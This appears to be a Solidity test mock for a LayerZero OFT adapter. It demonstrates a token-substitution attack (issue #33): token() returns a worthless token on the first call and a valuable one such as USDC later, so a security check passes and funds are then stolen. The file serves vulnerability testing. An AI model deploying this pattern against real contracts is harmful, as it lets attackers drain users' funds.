// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {
    IOFT,
    SendParam,
    MessagingFee,
    OFTReceipt,
    OFTLimit,
    OFTFeeDetail
} from "@layerzerolabs/oft-evm/contracts/interfaces/IOFT.sol";
import {MessagingReceipt} from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";

/**
 * @title MaliciousOFTAdapter
 * @notice Mock OFT adapter that changes its token() return value to exploit token substitution vulnerability
 * @dev This contract is used in tests to demonstrate issue #33 - Token substitution attack
 *
 * Attack flow:
 * 1. First call to token() returns worthlessToken (not depositable)
 * 2. Subsequent calls to token() returns valuableToken (depositable, like USDC)
 * 3. This allows bypassing the security check in lzCompose while stealing funds in handleCompose
 */
contract MaliciousOFTAdapter is IOFT {
    address public worthlessToken;
    address public valuableToken;
    address public endpointAddr;
    uint256 public callCount;

    // Track if approvalRequired to mimic OFT adapter behavior
    bool public constant approvalRequired = true;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address _worthlessToken, address _valuableToken) {
        worthlessToken = _worthlessToken;
        valuableToken = _valuableToken;
        callCount = 0;
    }

    function setEndpoint(address _endpoint) external {
        endpointAddr = _endpoint;
    }

    // IOAppCore-compatible surface
    function endpoint() external view returns (address) {
        return endpointAddr;
    }

    /**
     * @notice Malicious token() implementation
     * @dev Uses callCount to determine which token to return
     * @dev Note: In a real attack, this could be done via assembly/storage manipulation
     * @return The token address (changes based on callCount state)
     */
    function token() external view returns (address) {
        // When callCount is 0: return worthlessToken (first call - security check)
        // When callCount >= 1: return valuableToken (subsequent calls - actual deposit)
        if (callCount == 0) {
            return worthlessToken;
        } else {
            return valuableToken;
        }
    }

    /**
     * @notice Increment call counter - for manual testing
     */
    function incrementCallCount() external {
        callCount++;
    }

    function oftVersion() external pure returns (bytes4, uint64) {
        return (bytes4(0x02e49c2c), 1);
    }

    function sharedDecimals() external pure returns (uint8) {
        return 18;
    }

    function quoteOFT(SendParam calldata)
        external
        pure
        returns (OFTLimit memory limit, OFTFeeDetail[] memory feeDetails, OFTReceipt memory receipt)
    {
        limit = OFTLimit({minAmountLD: 0, maxAmountLD: type(uint256).max});
        feeDetails = new OFTFeeDetail[](0);
        receipt = OFTReceipt({amountSentLD: 0, amountReceivedLD: 0});
    }

    function quoteSend(SendParam calldata, bool) external pure returns (MessagingFee memory) {
        return MessagingFee(0.01 ether, 0);
    }

    function send(SendParam calldata _sendParam, MessagingFee calldata fee, address)
        external
        payable
        returns (MessagingReceipt memory, OFTReceipt memory)
    {
        require(msg.value >= fee.nativeFee, "fee");
        return (MessagingReceipt(bytes32(uint256(1)), 1, fee), OFTReceipt(_sendParam.amountLD, _sendParam.amountLD));
    }

    // Minimal helper to satisfy forceApprove in tests
    function forceApprove(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }
}
